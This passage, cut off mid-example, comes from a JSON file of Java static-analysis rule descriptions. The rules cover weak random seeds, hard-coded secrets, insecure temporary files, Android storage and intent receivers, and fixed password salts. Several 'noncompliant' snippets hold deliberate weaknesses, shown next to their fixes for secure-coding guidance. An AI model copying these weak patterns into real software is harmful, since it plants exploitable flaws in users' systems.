        "htmlDesc": "<p>Cryptographic operations often rely on unpredictable random numbers to enhance security. These random numbers are created by cryptographically\nsecure pseudo-random number generators (CSPRNG). It is important not to use a predictable seed with these random number generators otherwise the\nrandom numbers will also become predictable.</p>\n<h2>Why is this an issue?</h2>\n<p>Random number generators are often used to generate random values for cryptographic algorithms. When a random number generator is used for\ncryptographic purposes, the generated numbers must be as random and unpredictable as possible. When the random number generator is improperly seeded\nwith a constant or a predictable value, its output will also be predictable.</p>\n<p>This can have severe security implications for cryptographic operations that rely on the randomness of the generated numbers. By using a\npredictable seed, an attacker can potentially guess or deduce the generated numbers, compromising the security of whatever cryptographic algorithm\nrelies on the random number generator.</p>\n<h3>What is the potential impact?</h3>\n<p>It is crucial to understand that the strength of cryptographic algorithms heavily relies on the quality of the random numbers used. By improperly\nseeding a CSPRNG, we introduce a significant weakness that can be exploited by attackers.</p>\n<h4>Insecure cryptographic keys</h4>\n<p>One of the primary use cases for CSPRNGs is generating cryptographic keys. If an attacker can predict the seed used to initialize the random number\ngenerator, they may be able to derive the same keys. Depending on the use case, this can lead to multiple severe outcomes, such as:</p>\n<ul>\n  <li> Being able to decrypt sensitive documents, leading to privacy breaches or identity theft. </li>\n  <li> Gaining access to a private key used for signing, allowing an attacker to forge digital signatures and impersonate legitimate entities. </li>\n  <li> Bypassing authentication mechanisms that rely on public-key infrastructure (PKI), which can be abused to gain unauthorized access to systems or\n  networks. </li>\n</ul>\n<h4>Session hijacking and man-in-the-middle attack</h4>\n<p>Another scenario where this vulnerability can be exploited is in the generation of session tokens or nonces for secure communication protocols. If\nan attacker can predict the seed used to generate these tokens, they can impersonate legitimate users or intercept sensitive information.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code uses a cryptographically strong random number generator to generate data that is not cryptographically strong.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nSecureRandom sr = new SecureRandom();\nsr.setSeed(123456L); // Noncompliant\nint v = sr.next(32);\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nSecureRandom sr = new SecureRandom(\"abcdefghijklmnop\".getBytes(\"us-ascii\")); // Noncompliant\nint v = sr.next(32);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nSecureRandom sr = new SecureRandom();\nint v = sr.next(32);\n</pre>\n<p>This solution is available for JDK 1.8 and higher.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nSecureRandom sr = SecureRandom.getInstanceStrong();\nint v = sr.next(32);\n</pre>\n<h3>How does this work?</h3>\n<p>When the randomly generated data needs to be cryptographically strong, <code>SecureRandom</code> is the correct class to use. However, its\ndocumentation also cites that \"any seed material passed to a <code>SecureRandom</code> object must be unpredictable\". When no seed is passed by the\nuser to the object, the <code>SecureRandom</code> object chooses an unpredictable seed by default. Therefore, the easiest way to fix the issue is to\nuse the default constructor without any calls to <code>SecureObject.setSeed()</code>.</p>\n<p>To go the extra mile, <code>SecureObject.getInstanceStrong()</code> returns an instance of <code>SecureObject</code> that is guaranteed to use a\nstrong algorithm for its number generation.</p>\n<p>If the randomly generated data is not used for cryptographic purposes and is not business critical, it may be a better choice to use\n<code>java.util.Random</code> instead. In this case, setting a predictable seed may be acceptable depending on the situation.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/security/SecureRandom.html\">Class\n  <code>java.security.SecureRandom</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/332\">CWE-332 - Insufficient Entropy in PRNG</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/336\">CWE-336 - Same Seed in Pseudo-Random Number Generator (PRNG)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/337\">CWE-337 - Predictable Seed in Pseudo-Random Number Generator (PRNG)</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded\">CERT, MSC63J.</a> - Ensure that\n  SecureRandom is properly seeded </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5689": {
        "name": "Disclosing fingerprints from web application technologies is security-sensitive",
        "htmlDesc": "<p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a\nsignificant security risk depending on the production environement.</p>\n<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>\n<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit\nknown vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those\nvulnerabilities.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Version information is accessible to end users. </li>\n  <li> Internal systems do not benefit from timely patch management workflows. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying\narchitectures. This is known as the \"need to know\" principle.</p>\n<p>The most effective solution is to remove version information disclosure from what end users can see, such as the \"x-powered-by\" header.<br> This\ncan be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>\n<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that\nthis does not provide as much protection as regular updates and patches.<br> Security by obscurity is the least foolproof solution of all. It should\nnever be the only defense mechanism and should always be combined with other security measures.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n@GetMapping(value = \"/example\")\npublic ResponseEntity&lt;String&gt; example() {\n  HttpHeaders responseHeaders = new HttpHeaders();\n  responseHeaders.set(\"x-powered-by\", \"myproduct\"); // Sensitive\n\n  return new ResponseEntity&lt;String&gt;(\n      \"example\",\n      responseHeaders,\n      HttpStatus.CREATED);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Do not disclose version information unless necessary. The <code>x-powered-by</code> or <code>Server</code> HTTP headers should not be used.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html\">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Information Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S5322": {
        "name": "Receiving intents is security-sensitive",
        "htmlDesc": "<p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led\nin the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1677\">CVE-2019-1677</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1275\">CVE-2015-1275</a> </li>\n</ul>\n<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will\nstart the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>\n<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications\nthat can send broadcasts to the receiver.</p>\n<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a\nbroadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a\nmessage to the receiver.</p>\n<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The data extracted from intents is not sanitized. </li>\n  <li> Intents broadcast is not restricted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Restrict the access to broadcasted intents. See the <a\nhref=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> for more\ninformation.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.IntentFilter;\nimport android.os.Build;\nimport android.os.Handler;\nimport android.support.annotation.RequiresApi;\n\npublic class MyIntentReceiver {\n\n    @RequiresApi(api = Build.VERSION_CODES.O)\n    public void register(Context context, BroadcastReceiver receiver,\n                         IntentFilter filter,\n                         String broadcastPermission,\n                         Handler scheduler,\n                         int flags) {\n        context.registerReceiver(receiver, filter); // Sensitive\n        context.registerReceiver(receiver, filter, flags); // Sensitive\n\n        // Broadcasting intent with \"null\" for broadcastPermission\n        context.registerReceiver(receiver, filter, null, scheduler); // Sensitive\n        context.registerReceiver(receiver, filter, null, scheduler, flags); // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.IntentFilter;\nimport android.os.Build;\nimport android.os.Handler;\nimport android.support.annotation.RequiresApi;\n\npublic class MyIntentReceiver {\n\n    @RequiresApi(api = Build.VERSION_CODES.O)\n    public void register(Context context, BroadcastReceiver receiver,\n                         IntentFilter filter,\n                         String broadcastPermission,\n                         Handler scheduler,\n                         int flags) {\n\n        context.registerReceiver(receiver, filter, broadcastPermission, scheduler);\n        context.registerReceiver(receiver, filter, broadcastPermission, scheduler, flags);\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec\n  Verification Standard - Platform Interaction Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">Mobile Top 10 2016 Category M1 - Improper\n  Platform Usage</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/925\">CWE-925 - Improper Verification of Intent by Broadcast Receiver</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/926\">CWE-926 - Improper Export of Android Application Components</a> </li>\n  <li> <a href=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> -\n  Broadcast Overview - Security considerations and best practices </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:\n    <ul>\n      <li> The generated filename is unpredictable </li>\n      <li> The file is readable and writable only by the creating user ID </li>\n      <li> The file descriptor is not inherited by child processes </li>\n      <li> The file will be destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nnew File(\"/tmp/myfile.txt\"); // Sensitive\nPaths.get(\"/tmp/myfile.txt\"); // Sensitive\n\njava.io.File.createTempFile(\"prefix\", \"suffix\"); // Sensitive, will be in the default temporary-file directory.\njava.nio.file.Files.createTempDirectory(\"prefix\"); // Sensitive, will be in the default temporary-file directory.\n</pre>\n<pre>\nMap&lt;String, String&gt; env = System.getenv();\nenv.get(\"TMP\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nnew File(\"/myDirectory/myfile.txt\");  // Compliant\n\nFile.createTempFile(\"prefix\", \"suffix\", new File(\"/mySecureDirectory\"));  // Compliant\n\nif(SystemUtils.IS_OS_UNIX) {\n  FileAttribute&lt;Set&lt;PosixFilePermission&gt;&gt; attr = PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString(\"rwx------\"));\n  Files.createTempFile(\"prefix\", \"suffix\", attr); // Compliant\n}\nelse {\n  File f = Files.createTempFile(\"prefix\", \"suffix\").toFile();  // Compliant\n  f.setReadable(true, true);\n  f.setWritable(true, true);\n  f.setExecutable(true, true);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5445": {
        "name": "Insecure temporary file creation methods should not be used",
        "htmlDesc": "<p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a\nsituation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that\nare not atomic.</p>\n<h2>Why is this an issue?</h2>\n<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a\ngiven file between when the application chooses its name and when it creates it.</p>\n<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be\ndifferent than expected. This can lead to trust boundary issues.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s\nlogic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or\nemptied. They may also alter the file’s content before or while the application uses it.</p>\n<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various\nconsequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>\n<h4>Information disclosure</h4>\n<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.\nThis might be especially critical if this information is sensitive.</p>\n<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those\nfiles can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>\n<h4>Attack surface extension</h4>\n<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In\nthat case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In\nsuch a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>\n<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'\ncontent can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the\napplication hosting server and take it over.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.io.File;\nimport java.io.IOException;\n\nprotected void Example() throws IOException {\n    File tempDir;\n    tempDir = File.createTempFile(\"\", \".\");\n    tempDir.delete();\n    tempDir.mkdir();  // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\n\nprotected void Example() throws IOException {\n    Path tempPath = Files.createTempDirectory(\"\");\n    File tempDir = tempPath.toFile();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and\npermissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>\n<h4>Use a secure API function</h4>\n<p>Temporary files handling APIs generally provide secure functions to create temporary files. In most cases, they operate in an atomical way,\ncreating and opening a file with a unique and unpredictable name in a single call. Those functions can often be used to replace less secure\nalternatives without requiring important development efforts.</p>\n<p>Here, the example compliant code uses the safer <code>Files.createTempDirectory</code> function to manage the creation of temporary\ndirectories.</p>\n<h4>Strong security controls</h4>\n<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling\nfunctions and APIs can also be used for that purpose.</p>\n<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating\nthe files:</p>\n<ul>\n  <li> Files should be created in a non-public directory. </li>\n  <li> File names should be unique. </li>\n  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>\n  <li> File creation should fail if a target file already exists. </li>\n</ul>\n<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP</a> - Insecure Temporary File </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5324": {
        "name": "Accessing Android external storage is security-sensitive",
        "htmlDesc": "<p>Storing data locally is a common task for mobile applications. Such data includes files among other things. One convenient way to store files is to\nuse the external file storage which usually offers a larger amount of disc space compared to internal storage.</p>\n<p>Files created on the external storage are globally readable and writable. Therefore, a malicious application having the permissions\n<code>WRITE_EXTERNAL_STORAGE</code> or <code>READ_EXTERNAL_STORAGE</code> could try to read sensitive information from the files that other\napplications have stored on the external storage.</p>\n<p>External storage can also be removed by the user (e.g when based on SD card) making the files unavailable to the application.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Your application uses external storage to:</p>\n<ul>\n  <li> store files that contain sensitive data. </li>\n  <li> store files that are not meant to be shared with other application. </li>\n  <li> store files that are critical for the application to work. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use internal storage whenever possible as the system prevents other apps from accessing this location. </li>\n  <li> Only use external storage if you need to share non-sensitive files with other applications. </li>\n  <li> If your application has to use the external storage to store sensitive data, make sure it encrypts the files using <a\n  href=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedFile\">EncryptedFile</a>. </li>\n  <li> Data coming from external storage should always be considered untrusted and should be validated. </li>\n  <li> As some external storage can be removed, make sure to never store files on it that are critical for the usability of your application. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.content.Context;\n\npublic class AccessExternalFiles {\n\n    public void accessFiles(Context context) {\n        context.getExternalFilesDir(null); // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.content.Context;\n\npublic class AccessExternalFiles {\n\n    public void accessFiles(Context context) {\n        context.getFilesDir();\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/security-tips#ExternalStorage\">Android Security tips on external file storage</a>\n  </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard - Data Storage and Privacy Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">Mobile Top 10 2016 Category M2 - Insecure\n  Data Storage</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/312\">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S6418": {
        "name": "Hard-coded secrets are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, secrets should not be hard-coded. This is particularly true for\napplications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25510\">CVE-2022-25510</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42635\">CVE-2021-42635</a> </li>\n</ul>\n<p>Secrets should be stored outside of the source code in a configuration file or a management service for secrets.</p>\n<p>This rule detects variables/fields having a name matching a list of words (secret, token, credential, auth, api[_.-]?key) being assigned a\npseudorandom hard-coded value. The pseudorandomness of the hard-coded value is based on its entropy and the probability to be human-readable. The\nrandomness sensibility can be adjusted if needed. Lower values will detect less random values, raising potentially more false positives.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The secret allows access to a sensitive component like a database, a file storage, an API, or a service. </li>\n  <li> The secret is used in a production environment. </li>\n  <li> Application re-distribution is required before updating the secret. </li>\n</ul>\n<p>There would be a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the secret in a configuration file that is not pushed to the code repository. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a secret has been disclosed through the source code: revoke it and create a new one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nprivate static final String MY_SECRET = \"47828a8dd77ee1eb9dde2d5e93cb221ce8c32b37\";\n\npublic static void main(String[] args) {\n  MyClass.callMyService(MY_SECRET);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Using <a href=\"https://github.com/awsdocs/aws-doc-sdk-examples/tree/main/javav2/example_code/secretsmanager\">AWS Secrets Manager</a>:</p>\n<pre>\nimport software.amazon.awssdk.services.secretsmanager.model.GetSecretValueRequest;\nimport software.amazon.awssdk.services.secretsmanager.model.GetSecretValueResponse;\n\npublic static void main(String[] args) {\n  SecretsManagerClient secretsClient = ...\n  MyClass.doSomething(secretsClient, \"MY_SERVICE_SECRET\");\n}\n\npublic static void doSomething(SecretsManagerClient secretsClient, String secretName) {\n  GetSecretValueRequest valueRequest = GetSecretValueRequest.builder()\n    .secretId(secretName)\n    .build();\n\n  GetSecretValueResponse valueResponse = secretsClient.getSecretValue(valueRequest);\n  String secret = valueResponse.secretString();\n  // do something with the secret\n  MyClass.callMyService(secret);\n}\n</pre>\n<p>Using <a href=\"https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-java?tabs=azure-cli\">Azure Key Vault Secret</a>:</p>\n<pre>\nimport com.azure.identity.DefaultAzureCredentialBuilder;\n\nimport com.azure.security.keyvault.secrets.SecretClient;\nimport com.azure.security.keyvault.secrets.SecretClientBuilder;\nimport com.azure.security.keyvault.secrets.models.KeyVaultSecret;\n\npublic static void main(String[] args) throws InterruptedException, IllegalArgumentException {\n  String keyVaultName = System.getenv(\"KEY_VAULT_NAME\");\n  String keyVaultUri = \"https://\" + keyVaultName + \".vault.azure.net\";\n\n  SecretClient secretClient = new SecretClientBuilder()\n    .vaultUrl(keyVaultUri)\n    .credential(new DefaultAzureCredentialBuilder().build())\n    .buildClient();\n\n  MyClass.doSomething(secretClient, \"MY_SERVICE_SECRET\");\n}\n\npublic static void doSomething(SecretClient secretClient, String secretName) {\n  KeyVaultSecret retrievedSecret = secretClient.getSecret(secretName);\n  String secret = retrievedSecret.getValue(),\n\n  // do something with the secret\n  MyClass.callMyService(secret);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "java:S2053": {
        "name": "Password hashing functions should use an unpredictable salt",
        "htmlDesc": "<p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>\n<h2>Why is this an issue?</h2>\n<p>During the process of password hashing, an additional component, known as a \"salt,\" is often integrated to bolster the overall security. This salt,\nacting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>\n<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it\nis too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.\nSimilarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical\npassword hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on\nimplementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>\n<h3>What is the potential impact?</h3>\n<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.\nThis could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>\n<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying\nevery possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt\ncan make the task significantly easier and faster.</p>\n<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully\ncracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>\n<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters\nof password hashes with identical salt that can then be attacked as explained before.</p>\n<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter\nthe salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>\n<h3>Exceptions</h3>\n<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such\nfunctions are:</p>\n<ul>\n  <li> Argon2 </li>\n  <li> PBKDF2 </li>\n  <li> Scrypt </li>\n  <li> Bcrypt </li>\n</ul>\n<p>When they are used for password storage, using a secure, random salt is required.</p>\n<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those\ncases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed\nsalt is safe and accepted.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of hard-coded salts.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.spec.PBEParameterSpec;\n\npublic void hash() {\n    byte[] salt = \"salty\".getBytes();\n    PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.security.SecureRandom;\nimport javax.crypto.spec.PBEParameterSpec;\n\npublic void hash() 